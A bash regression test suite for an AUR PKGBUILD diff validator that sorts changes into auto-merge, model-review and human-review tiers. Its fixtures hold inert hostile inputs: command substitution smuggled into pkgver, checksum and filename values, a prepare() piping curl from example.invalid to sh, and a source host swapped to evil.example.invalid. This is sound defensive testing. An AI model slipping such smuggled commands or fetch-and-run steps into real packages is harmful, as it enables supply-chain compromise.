#!/usr/bin/env bash
# Adversarial regression tests for scripts/validate-aur-diff.py.
#
# Each case asserts the *tier* a change lands in, because the tier decides who
# reads it: A merges on a literal-grammar check, B is read line by line by an
# isolated model review, C stops for a human. A case that drifts from C to B has
# quietly handed a human's decision to a model, and from B to A has removed the
# review altogether -- neither shows up as a failure anywhere else.
#
# These also encode the two vulnerabilities found in the 2026-09-08 security
# review so they cannot silently return:
#
#   - a PKGBUILD assignment that looks routine by prefix but executes code,
#     which the old prefix-stripping filter reported as "nothing but routine
#     version/checksum lines";
#   - a vendored filename carrying shell metacharacters, which the workflow
#     used to interpolate into `run:` script source.
#
# Every payload is inert: the worst any fixture does is name a file oddly or
# write the literal text of a command into a PKGBUILD that is never executed.
# Nothing here runs makepkg, contacts the AUR, or touches the real repository.
#
# Usage: scripts/test-aur-validator.sh

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
VALIDATOR="$REPO_ROOT/scripts/validate-aur-diff.py"

pass=0
fail=0

# A minimal but realistic vendored package, used as the base of every fixture.
BASE_PKGBUILD='pkgname=demo-bin
pkgver=1.0.0
pkgrel=1
arch=("x86_64")
url="https://example.invalid/demo"
source=("https://downloads.claude.ai/demo-${pkgver}.tar.gz")
sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")

package() {
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}'

BASE_MANIFEST='demo-bin	1111111111111111111111111111111111111111	2026-01-01'

# new_fixture <dir> [base-mutator] -- a git repo with the base package
# committed. The optional mutator runs before the commit, so a test can start
# from a package whose committed state already differs.
new_fixture() {
  local d="$1" base_mutate="${2:-}"
  mkdir -p "$d/aur/demo-bin"
  git -C "$d" init -q
  git -C "$d" config user.email t@example.invalid
  git -C "$d" config user.name test
  printf '%s\n' "$BASE_PKGBUILD" > "$d/aur/demo-bin/PKGBUILD"
  printf '%s\n' "$BASE_MANIFEST" > "$d/aur/manifest.tsv"
  [[ -n "$base_mutate" ]] && "$base_mutate" "$d"
  git -C "$d" add -A
  git -C "$d" commit -qm base
}

# expect <A|B|C> <name> <mutator> [base-mutator]
expect() {
  local want="$1" name="$2" mutate="$3" base_mutate="${4:-}"
  local d
  d="$(mktemp -d)"
  new_fixture "$d" "$base_mutate"
  "$mutate" "$d"
  git -C "$d" add -A aur/

  local got out status
  out="$(python3 "$VALIDATOR" --repo "$d" --tier-file "$d/tier" 2>&1)" && status=0 || status=$?
  got="$(cat "$d/tier" 2>/dev/null || echo '?')"
  # Exit status and tier must agree: 0 only for A, 1 for anything else.
  if [[ ( "$got" == A && "$status" != 0 ) || ( "$got" != A && "$status" != 1 ) ]]; then
    got="$got/exit$status"
  fi

  if [[ "$got" == "$want" ]]; then
    printf '  ok   %-52s %s\n' "$name" "$got"
    pass=$((pass + 1))
  else
    printf '  FAIL %-52s want %s got %s\n' "$name" "$want" "$got"
    printf '%s\n' "$out" | sed 's/^/       | /'
    fail=$((fail + 1))
  fi
  rm -rf "$d"
}

# --- the shapes a routine bump legitimately takes -------------------------

m_ordinary_bump() {
  sed -i 's/^pkgver=1.0.0$/pkgver=1.0.1/' "$1/aur/demo-bin/PKGBUILD"
  sed -i 's/0000000000000000000000000000000000000000000000000000000000000000/1111111111111111111111111111111111111111111111111111111111111111/' "$1/aur/demo-bin/PKGBUILD"
  printf 'demo-bin\t2222222222222222222222222222222222222222\t2026-02-02\n' > "$1/aur/manifest.tsv"
}

m_pkgrel_only() { sed -i 's/^pkgrel=1$/pkgrel=2/' "$1/aur/demo-bin/PKGBUILD"; }

# Starts from a package whose committed checksum is SKIP, so the diff really is
# SKIP -> real checksum rather than a change of quoting style.
b_checksum_is_skip() {
  sed -i 's|^sha256sums=.*|sha256sums=("SKIP")|' "$1/aur/demo-bin/PKGBUILD"
}

m_skip_to_real_checksum() {
  sed -i "s/^sha256sums=.*/sha256sums=('3333333333333333333333333333333333333333333333333333333333333333')/" "$1/aur/demo-bin/PKGBUILD"
}

# Cursor keeps SKIP in the initial array and overwrites it with a literal hash.
b_indexed_checksum() {
  printf "\nsha512sums=('SKIP')\nsha512sums[0]=%0128d\n" 0 >> "$1/aur/demo-bin/PKGBUILD"
}

m_indexed_checksum() {
  sed -i '/^sha512sums\[0\]=/d' "$1/aur/demo-bin/PKGBUILD"
  printf 'sha512sums[0]=%0128d\n' 1 >> "$1/aur/demo-bin/PKGBUILD"
}

m_indexed_checksum_quoted() {
  sed -i '/^sha512sums\[0\]=/d' "$1/aur/demo-bin/PKGBUILD"
  printf "sha512sums[0]='%0128d'\n" 1 >> "$1/aur/demo-bin/PKGBUILD"
}

m_indexed_checksum_double_quoted() {
  sed -i '/^sha512sums\[0\]=/d' "$1/aur/demo-bin/PKGBUILD"
  printf 'sha512sums[0]="%0128d"\n' 1 >> "$1/aur/demo-bin/PKGBUILD"
}

m_indexed_checksum_hostile() {
  local d="$1" payload
  sed -i '/^sha512sums\[0\]=/d' "$d/aur/demo-bin/PKGBUILD"
  case "$INDEXED_ATTACK" in
    subscript) payload='sha512sums[$(touch MARKER)]=00000000000000000000000000000000' ;;
    variable) payload='sha512sums[index]=00000000000000000000000000000000' ;;
    arithmetic) payload='sha512sums[1+1]=00000000000000000000000000000000' ;;
    value) payload='sha512sums[0]=$(touch MARKER)' ;;
    appended) payload='sha512sums[0]=00000000000000000000000000000000; touch MARKER' ;;
    continuation) payload='sha512sums[0]=00000000000000000000000000000000\' ;;
    skip) payload="sha512sums[0]='SKIP'" ;;
  esac
  printf '%s\n' "$payload" >> "$d/aur/demo-bin/PKGBUILD"
}

# --- finding 2: executable syntax hiding on a routine-looking line --------

m_command_substitution() {
  sed -i 's/^pkgver=1.0.0$/pkgver=1.0.1$(touch .\/MARKER)/' "$1/aur/demo-bin/PKGBUILD"
}

m_backtick_substitution() {
  sed -i 's|^pkgver=1.0.0$|pkgver=1.0.1`touch ./MARKER`|' "$1/aur/demo-bin/PKGBUILD"
}

m_appended_command() {
  sed -i 's|^pkgver=1.0.0$|pkgver=1.0.1; touch ./MARKER|' "$1/aur/demo-bin/PKGBUILD"
}

m_checksum_line_with_command() {
  sed -i "s|^sha256sums=.*|sha256sums=(\$(touch ./MARKER))|" "$1/aur/demo-bin/PKGBUILD"
}

m_checksum_downgraded_to_skip() {
  sed -i "s|^sha256sums=.*|sha256sums=('SKIP')|" "$1/aur/demo-bin/PKGBUILD"
}

m_new_build_function() {
  printf '\nprepare() {\n  curl -s https://example.invalid/x | sh\n}\n' >> "$1/aur/demo-bin/PKGBUILD"
}

m_source_url_changed() {
  sed -i 's|downloads.claude.ai|evil.example.invalid|' "$1/aur/demo-bin/PKGBUILD"
}

m_manifest_malformed() {
  printf 'demo-bin\tnot-a-commit\t2026-02-02\n' > "$1/aur/manifest.tsv"
}

# --- finding 1: hostile paths, modes and file types -----------------------

m_filename_command_substitution() {
  # The payload lives in the *name*. If any consumer interpolates this into
  # shell, MARKER appears; the validator must reject it as a path.
  printf 'x\n' > "$1/aur/demo-bin/\$(touch MARKER).sh"
}

m_added_install_scriptlet() {
  printf 'post_install() { :; }\n' > "$1/aur/demo-bin/demo.install"
}

m_pkgbuild_made_executable() {
  chmod +x "$1/aur/demo-bin/PKGBUILD"
}

m_pkgbuild_replaced_by_symlink() {
  rm "$1/aur/demo-bin/PKGBUILD"
  ln -s /etc/passwd "$1/aur/demo-bin/PKGBUILD"
}

m_pkgbuild_binary() { printf '\0binary\n' > "$1/aur/demo-bin/PKGBUILD"; }

m_package_deleted() { rm "$1/aur/demo-bin/PKGBUILD"; }

m_package_renamed() {
  mv "$1/aur/demo-bin/PKGBUILD" "$1/aur/demo-bin/PKGBUILD.old"
}

# --- versions must move forward -------------------------------------------
# Tier A never lets a source= line change, so the download host stays pinned --
# but pkgver and _commit are interpolated into those URLs, so a packager who
# cannot change the host can still choose an older artifact from it.

m_version_downgrade() { sed -i 's/^pkgver=1.0.0$/pkgver=0.9.0/' "$1/aur/demo-bin/PKGBUILD"; }

m_version_unchanged_pkgrel_down() {
  sed -i 's/^pkgrel=1$/pkgrel=0/' "$1/aur/demo-bin/PKGBUILD"
}

b_has_commit() {
  printf '_commit=%040d\n' 1 >> "$1/aur/demo-bin/PKGBUILD"
}

m_commit_moves_without_version() {
  sed -i "s/^_commit=.*/_commit=$(printf '%040d' 2)/" "$1/aur/demo-bin/PKGBUILD"
}

m_commit_moves_with_version() {
  sed -i "s/^_commit=.*/_commit=$(printf '%040d' 2)/" "$1/aur/demo-bin/PKGBUILD"
  sed -i 's/^pkgver=1.0.0$/pkgver=1.0.1/' "$1/aur/demo-bin/PKGBUILD"
}

# --- tier B: readable packager-authored code ------------------------------
# These are legitimate upstream shapes. They must reach a review, and must not
# be waved through as routine.

b_has_completion() {
  printf 'complete -c demo -l session\n' > "$1/aur/demo-bin/demo.fish"
  sed -i "s|^source=.*|source=('demo.fish')|" "$1/aur/demo-bin/PKGBUILD"
}

m_completion_edited() {
  printf 'complete -c demo -l machine\n' >> "$1/aur/demo-bin/demo.fish"
}

m_completion_edited_with_bump() {
  m_completion_edited "$1"
  sed -i 's/^pkgver=1.0.0$/pkgver=1.0.1/' "$1/aur/demo-bin/PKGBUILD"
}

# makepkg's default style opens the array on one line and closes it on a later
# one, which leaves every line of it unterminated. herdr-bin is written this
# way, so a real checksum bump has to validate as tier A.
b_multiline_checksums() {
  python3 - "$1/aur/demo-bin/PKGBUILD" <<'EOF'
import sys
p = sys.argv[1]
text = open(p).read().replace(
    'sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")',
    "sha256sums=('%s'\n            '%s')" % ("a" * 64, "b" * 64))
open(p, "w").write(text)
EOF
}

m_multiline_checksum_bump() {
  sed -i "s/'${MULTILINE_OLD}'/'${MULTILINE_NEW}'/" "$1/aur/demo-bin/PKGBUILD"
  sed -i 's/^pkgver=1.0.0$/pkgver=1.0.1/' "$1/aur/demo-bin/PKGBUILD"
}

# --- tier C: unreadable or unbounded --------------------------------------

m_control_character() {
  printf 'pkgdesc="demo\033[2Kdemo"\n' >> "$1/aur/demo-bin/PKGBUILD"
}

m_new_vendored_package() {
  mkdir -p "$1/aur/other-bin"
  printf 'pkgname=other-bin\npkgver=1.0.0\n' > "$1/aur/other-bin/PKGBUILD"
}

m_too_many_changed_lines() {
  python3 -c "
import sys
open(sys.argv[1], 'a').write('\n'.join('# filler %d' % i for i in range(500)) + '\n')
" "$1/aur/demo-bin/PKGBUILD"
}

m_install_assignment_added() {
  printf 'install=demo.install\n' >> "$1/aur/demo-bin/PKGBUILD"
}

echo "validate-aur-diff.py -- review tier for each change"
echo
echo "  tier A, merged on the literal grammar alone:"
expect A "ordinary version + checksum + manifest bump" m_ordinary_bump
expect A "pkgrel-only rebuild"                         m_pkgrel_only
expect A "SKIP replaced by a real checksum"            m_skip_to_real_checksum b_checksum_is_skip
expect A "Cursor-style indexed checksum bump"          m_indexed_checksum b_indexed_checksum
expect A "single-quoted indexed checksum"              m_indexed_checksum_quoted b_indexed_checksum
expect A "double-quoted indexed checksum"              m_indexed_checksum_double_quoted b_indexed_checksum
expect A "_commit moving with a pkgver bump"           m_commit_moves_with_version b_has_commit
MULTILINE_OLD="$(printf 'b%.0s' $(seq 64))"
MULTILINE_NEW="$(printf 'c%.0s' $(seq 64))"
expect A "multi-line checksum array bump"              m_multiline_checksum_bump b_multiline_checksums
echo
echo "  tier B, read line by line by an isolated review:"
expect B "new prepare() piping curl to sh"             m_new_build_function
expect B "added .install scriptlet"                    m_added_install_scriptlet
expect B "edited completion script"                    m_completion_edited b_has_completion
expect B "edited completion script plus a version bump" m_completion_edited_with_bump b_has_completion
expect B "manifest row not a commit hash"              m_manifest_malformed
echo
echo "  tier C, versions that do not move forward:"
expect C "pkgver moved backwards"                      m_version_downgrade
expect C "pkgrel moved backwards"                      m_version_unchanged_pkgrel_down
expect C "_commit moved with no pkgver bump"           m_commit_moves_without_version b_has_commit
echo
echo "  tier C -- indexed checksums must remain literal:"
for INDEXED_ATTACK in subscript variable arithmetic value appended continuation skip; do
  expect C "indexed checksum: $INDEXED_ATTACK" m_indexed_checksum_hostile b_indexed_checksum
done
echo
echo "  tier C -- finding 2, executable syntax on routine-looking lines:"
expect C "pkgver with command substitution"            m_command_substitution
expect C "pkgver with backtick substitution"           m_backtick_substitution
expect C "pkgver with appended command"                m_appended_command
expect C "checksum array containing a command"         m_checksum_line_with_command
expect C "checksum downgraded to SKIP"                 m_checksum_downgraded_to_skip
echo
echo "  tier C -- where an artifact comes from, and what runs as root:"
expect C "source URL host changed"                     m_source_url_changed
expect C "install= scriptlet bound to the package"     m_install_assignment_added
echo
echo "  tier C -- finding 1, hostile paths, modes and file types:"
expect C "filename containing command substitution"    m_filename_command_substitution
expect C "PKGBUILD made executable"                    m_pkgbuild_made_executable
expect C "PKGBUILD replaced by a symlink"              m_pkgbuild_replaced_by_symlink
expect C "PKGBUILD replaced by binary content"         m_pkgbuild_binary
expect C "vendored package deleted"                    m_package_deleted
expect C "vendored file renamed"                       m_package_renamed
echo
echo "  tier C -- unreadable or unbounded:"
expect C "control character in a changed line"         m_control_character
expect C "brand-new vendored package"                  m_new_vendored_package
expect C "change larger than the review cap"           m_too_many_changed_lines
echo
printf '%d passed, %d failed\n' "$pass" "$fail"
[[ $fail -eq 0 ]]
